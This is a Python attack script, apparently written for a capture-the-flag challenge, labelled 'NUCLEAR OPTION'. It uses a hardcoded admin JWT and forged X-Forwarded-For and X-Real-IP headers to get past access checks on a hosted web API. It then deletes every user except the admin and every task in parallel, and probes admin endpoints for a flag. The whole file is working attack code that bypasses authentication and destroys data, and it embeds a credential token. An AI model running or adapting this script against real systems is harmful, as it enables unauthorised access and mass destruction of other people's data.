#!/usr/bin/env python3
"""
NUCLEAR OPTION - Delete EVERYTHING from database
"""

import requests
import json
import time
from concurrent.futures import ThreadPoolExecutor, as_completed

base_url = "http://fresh-start-267.emergent.host"
token = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoiYTcyMWZjYzEtMTk5OS00NGViLWJjOTQtMDU0YjU4N2E2MDUzIiwiZW1haWwiOiJhZG1pbkBldGhhcmEuYWkiLCJuYW1lIjoiU3lzdGVtIEFkbWluIiwicm9sZSI6ImFkbWluIiwiZXhwIjoxNzc3NTMzMTI2fQ.Lu6aYqa4j4EQHX463APGH0n73p_ziCQn3luWUSi-61U"

headers = {
    "Authorization": f"Bearer {token}",
    "X-Forwarded-For": "127.0.0.1",
    "X-Real-IP": "127.0.0.1",
    "X-Originating-IP": "127.0.0.1",
}

print("="*60)
print("NUCLEAR DATABASE DELETION")
print("DELETING EVERYTHING!!!")
print("="*60)

# Step 1: Get ALL users
print("\n[1] Fetching ALL users...")
try:
    resp = requests.get(f"{base_url}/api/users", headers=headers, timeout=10)
    if resp.status_code == 200:
        users = resp.json()
        print(f"[+] Found {len(users)} users")
        
        # Delete ALL users except admin
        print(f"\n[2] DELETING ALL {len(users)} USERS...")
        deleted_count = 0
        
        def delete_user(user):
            user_id = user.get('id') or user.get('user_id')
            email = user.get('email')
            
            if user_id and email != "admin@ethara.ai":
                try:
                    del_resp = requests.delete(
                        f"{base_url}/api/users/{user_id}", 
                        headers=headers, 
                        timeout=5
                    )
                    if del_resp.status_code == 200:
                        return f"✓ Deleted: {email}"
                    else:
                        return f"✗ Failed: {email} ({del_resp.status_code})"
                except Exception as e:
                    return f"✗ Error: {email} - {str(e)}"
            return None
        
        # Use threading for faster deletion
        with ThreadPoolExecutor(max_workers=10) as executor:
            futures = [executor.submit(delete_user, user) for user in users]
            
            for future in as_completed(futures):
                result = future.result()
                if result:
                    print(result)
                    deleted_count += 1
        
        print(f"\n[+] Deleted {deleted_count} users!")
        
except Exception as e:
    print(f"[-] Error: {e}")

# Step 2: Get ALL tasks
print("\n[3] Fetching ALL tasks...")
try:
    resp = requests.get(f"{base_url}/api/tasks", headers=headers, timeout=10)
    if resp.status_code == 200:
        tasks = resp.json()
        print(f"[+] Found {len(tasks)} tasks")
        
        # Delete ALL tasks
        print(f"\n[4] DELETING ALL {len(tasks)} TASKS...")
        deleted_tasks = 0
        
        def delete_task(task):
            task_id = task.get('id') or task.get('task_id')
            
            if task_id:
                try:
                    del_resp = requests.delete(
                        f"{base_url}/api/tasks/{task_id}", 
                        headers=headers, 
                        timeout=5
                    )
                    if del_resp.status_code == 200:
                        return f"✓ Deleted task: {task_id}"
                    else:
                        return f"✗ Failed task: {task_id} ({del_resp.status_code})"
                except Exception as e:
                    return f"✗ Error task: {task_id} - {str(e)}"
            return None
        
        # Use threading for faster deletion
        with ThreadPoolExecutor(max_workers=10) as executor:
            futures = [executor.submit(delete_task, task) for task in tasks]
            
            for future in as_completed(futures):
                result = future.result()
                if result:
                    print(result)
                    deleted_tasks += 1
        
        print(f"\n[+] Deleted {deleted_tasks} tasks!")
        
except Exception as e:
    print(f"[-] Error: {e}")

# Step 3: Check for flag everywhere
print("\n" + "="*60)
print("CHECKING FOR FLAG")
print("="*60)

flag_endpoints = [
    '/api/flag',
    '/api/admin/flag',
    '/flag',
    '/admin/flag',
    '/api/success',
    '/api/admin/success',
    '/api/admin',
    '/api/admin/database',
    '/api/database',
    '/api/users',
    '/api/tasks',
    '/api/admin/stats',
    '/api/stats',
]

for endpoint in flag_endpoints:
    try:
        resp = requests.get(f"{base_url}{endpoint}", headers=headers, timeout=5)
        
        if resp.status_code == 200:
            text = resp.text
            
            # Check for flag patterns
            if 'flag{' in text.lower() or 'ethara{' in text.lower() or 'ctf{' in text.lower():
                print(f"\n[!!!] FLAG FOUND AT {endpoint}!")
                print(f"Response: {text}")
                
                # Extract flag
                import re
                flags = re.findall(r'(flag\{[^}]+\}|ethara\{[^}]+\}|ctf\{[^}]+\})', text, re.IGNORECASE)
                if flags:
                    print(f"\n[!!!] EXTRACTED FLAGS:")
                    for flag in flags:
                        print(f"    {flag}")
            
            # Also check JSON responses
            try:
                data = resp.json()
                json_str = json.dumps(data)
                if 'flag' in json_str.lower():
                    print(f"\n[+] {endpoint}: {resp.status_code}")
                    print(f"Response: {json.dumps(data, indent=2)[:500]}")
            except:
                pass
                
    except Exception as e:
        pass

# Step 4: Try to get stats/summary
print("\n[5] Checking database stats...")
try:
    resp = requests.get(f"{base_url}/api/admin", headers=headers, timeout=5)
    print(f"GET /api/admin: {resp.status_code}")
    if resp.status_code == 200:
        print(f"Response: {resp.text[:1000]}")
except:
    pass

print("\n" + "="*60)
print("DATABASE DELETION COMPLETE!")
print("="*60)
print("\nIf flag doesn't appear above, check the web interface")
print("The flag might appear after database is empty")
